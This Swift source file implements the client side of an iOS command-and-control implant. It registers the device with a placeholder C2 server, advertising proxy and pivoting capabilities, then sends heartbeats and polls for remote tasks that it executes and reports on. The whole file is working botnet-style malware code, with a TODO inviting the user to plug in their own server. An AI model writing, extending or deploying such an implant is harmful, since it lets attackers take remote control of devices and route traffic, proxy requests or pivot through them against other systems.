import Foundation
import UIKit

class C2Manager {

    static let shared = C2Manager()

    private var nodeId: String?
    private var apiKey: String?
    private var isRunning = false

    // TODO: Change to your C2 server URL
    private let baseURL = "http://your-c2-server.com:8000"

    private var heartbeatTimer: Timer?
    private var taskPollTimer: Timer?

    private init() {
        loadCredentials()
    }

    func start() {
        guard !isRunning else { return }
        isRunning = true

        if nodeId == nil {
            Task {
                await register()
            }
        }

        startHeartbeat()
        startTaskPolling()
    }

    func stop() {
        isRunning = false
        heartbeatTimer?.invalidate()
        taskPollTimer?.invalidate()
    }

    // MARK: - Registration

    func register() async {
        let device = UIDevice.current

        let deviceInfo: [String: Any] = [
            "node_type": "ios",
            "device_name": device.name,
            "os_version": device.systemVersion,
            "model": device.model,
            "capabilities": [
                "port_scan": false,  // Limited on iOS
                "proxy": true,
                "traffic_gen": true,
                "pivoting": true
            ]
        ]

        guard let url = URL(string: "\\(baseURL)/api/nodes/register") else { return }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.httpBody = try? JSONSerialization.data(withJSONObject: deviceInfo)

        do {
            let (data, _) = try await URLSession.shared.data(for: request)
            if let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] {
                nodeId = json["node_id"] as? String
                apiKey = json["api_key"] as? String
                saveCredentials()
            }
        } catch {
            print("Registration failed: \\(error)")
        }
    }

    // MARK: - Heartbeat

    func startHeartbeat() {
        heartbeatTimer = Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { [weak self] _ in
            Task {
                await self?.sendHeartbeat()
            }
        }
    }

    func sendHeartbeat() async {
        guard let nodeId = nodeId, let apiKey = apiKey else { return }

        let heartbeat: [String: Any] = ["status": "online"]

        guard let url = URL(string: "\\(baseURL)/api/nodes/heartbeat") else { return }

        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(nodeId, forHTTPHeaderField: "X-Node-ID")
        request.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
        request.httpBody = try? JSONSerialization.data(withJSONObject: heartbeat)

        do {
            let (_, response) = try await URLSession.shared.data(for: request)
            if let httpResponse = response as? HTTPURLResponse {
                print("Heartbeat: \\(httpResponse.statusCode)")
            }
        } catch {
            print("Heartbeat failed: \\(error)")
        }
    }

    // MARK: - Task Polling

    func startTaskPolling() {
        taskPollTimer = Timer.scheduledTimer(withTimeInterval: 15, repeats: true) { [weak self] _ in
            Task {
                await self?.pollTasks()
            }
        }
    }

    func pollTasks() async {
        guard let nodeId = nodeId, let apiKey = apiKey else { return }
        guard let url = URL(string: "\\(baseURL)/api/tasks/pending") else { return }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue(nodeId, forHTTPHeaderField: "X-Node-ID")
        request.setValue(apiKey, forHTTPHeaderField: "X-API-Key")

        do {
            let (data, _) = try await URLSession.shared.data(for: request)
            if let tasks = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]] {
                for task in tasks {
                    await executeTask(task)
                }
            }
        } catch {
            print("Task polling failed: \\(error)")
        }
    }

    // MARK: - Task Execution

    func executeTask(_ task: [String: Any]) async {
        guard let taskId = task["task_id"] as? String,
              let taskType = task["task_type"] as? String,
              let parameters = task["parameters"] as? [String: Any] else { return }

        await updateTaskStatus(taskId, status: "running")

        var result: [String: Any] = [:]
        var error: String?
        var finalStatus = "completed"

        switch taskType {
        case "traffic_gen":
            result = await TrafficGenModule.execute(parameters: parameters)
        case "proxy_request":
            result = await ProxyModule.execute(parameters: parameters)
        case "custom":
            result = await CustomModule.execute(parameters: parameters)
        default:
            error = "Unknown task type: \\(taskType)"
            finalStatus = "failed"
        }

        await updateTaskStatus(taskId, status: finalStatus, result: result, error: error)
    }

    func updateTaskStatus(_ taskId: String, status: String, result: [String: Any]? = nil, error: String? = nil) async {
        guard let nodeId = nodeId, let apiKey = apiKey else { return }
        guard let url = URL(string: "\\(baseURL)/api/tasks/\\(taskId)") else { return }

        var update: [String: Any] = ["status": status]
        if let result = result {
            update["result"] = result
        }
        if let error = error {
            update["error_message"] = error
        }

        var request = URLRequest(url: url)
        request.httpMethod = "PATCH"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(nodeId, forHTTPHeaderField: "X-Node-ID")
        request.setValue(apiKey, forHTTPHeaderField: "X-API-Key")
        request.httpBody = try? JSONSerialization.data(withJSONObject: update)

        do {
            let (_, _) = try await URLSession.shared.data(for: request)
        } catch {
            print("Task update failed: \\(error)")
        }
    }

    // MARK: - Background Tasks

    func performBackgroundTasks() async {
        await sendHeartbeat()
        await pollTasks()
    }

    // MARK: - Credentials

    func saveCredentials() {
        UserDefaults.standard.set(nodeId, forKey: "node_id")
        UserDefaults.standard.set(apiKey, forKey: "api_key")
    }

    func loadCredentials() {
        nodeId = UserDefaults.standard.string(forKey: "node_id")
        apiKey = UserDefaults.standard.string(forKey: "api_key")
    }
}
